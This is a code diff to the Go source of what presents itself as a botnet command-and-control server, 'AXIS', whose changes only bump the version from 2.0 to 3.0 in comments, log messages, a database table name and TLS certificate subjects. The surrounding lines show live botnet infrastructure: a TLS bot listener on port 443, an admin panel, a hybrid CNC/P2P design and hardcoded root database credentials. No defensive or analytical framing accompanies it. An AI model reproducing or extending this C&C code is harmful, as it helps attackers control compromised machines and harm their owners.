@@ -16,14 +16,14 @@ import (
 )
 
 /*
- * AXIS 2.0 C&C Server
+ * AXIS 3.0 C&C Server
  * Hybrid: Traditional CNC + P2P
  */
 
 const DatabaseAddr string = "127.0.0.1:3306"
 const DatabaseUser string = "root"
 const DatabasePass string = "root"
-const DatabaseTable string = "AXIS2"
+const DatabaseTable string = "AXIS3"
 
 /* Bot connection ports */
 const BotListenAddr string = "0.0.0.0:443"           /* Traditional CNC (TLS) */
@@ -65,7 +65,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Printf("AXIS 2.0 Bot Server (TLS) listening on %s\n", BotListenAddr)
+		fmt.Printf("AXIS 3.0 Bot Server (TLS) listening on %s\n", BotListenAddr)
 		for {
 			conn, err := botListener.Accept()
 			if err != nil {
@@ -101,7 +101,7 @@ func main() {
 		}
 
 		go func() {
-			fmt.Printf("AXIS 2.0 Admin Panel (TLS) listening on %s\n", TelnetTLSListenAddr)
+			fmt.Printf("AXIS 3.0 Admin Panel (TLS) listening on %s\n", TelnetTLSListenAddr)
 			for {
 				conn, err := tlsListener.Accept()
 				if err != nil {
@@ -121,7 +121,7 @@ func main() {
 
 	/* Status */
 	fmt.Println("")
-	fmt.Println("AXIS 2.0 C&C Server Running")
+	fmt.Println("AXIS 3.0 C&C Server Running")
 	fmt.Println("===========================")
 	fmt.Printf("Bots:      TLS on %s\n", BotListenAddr)
 	fmt.Printf("Admin:     TLS on %s\n", TelnetTLSListenAddr)
@@ -188,8 +188,8 @@ func getOrCreateTLSCertificate() (tls.Certificate, error) {
 	template := x509.Certificate{
 		SerialNumber: nil,
 		Subject: pkix.Name{
-			Organization: []string{"AXIS 2.0"},
-			CommonName:   "AXIS 2.0 Admin",
+			Organization: []string{"AXIS 3.0"},
+			CommonName:   "AXIS 3.0 Admin",
 		},
 		NotBefore:             time.Now(),
 		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
@@ -234,8 +234,8 @@ func getOrCreateBotTLSCertificate() (tls.Certificate, error) {
 	template := x509.Certificate{
 		SerialNumber: nil,
 		Subject: pkix.Name{
-			Organization: []string{"AXIS 2.0"},
-			CommonName:   "AXIS 2.0 Bot",
+			Organization: []string{"AXIS 3.0"},
+			CommonName:   "AXIS 3.0 Bot",
 		},
 		NotBefore:             time.Now(),
 		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
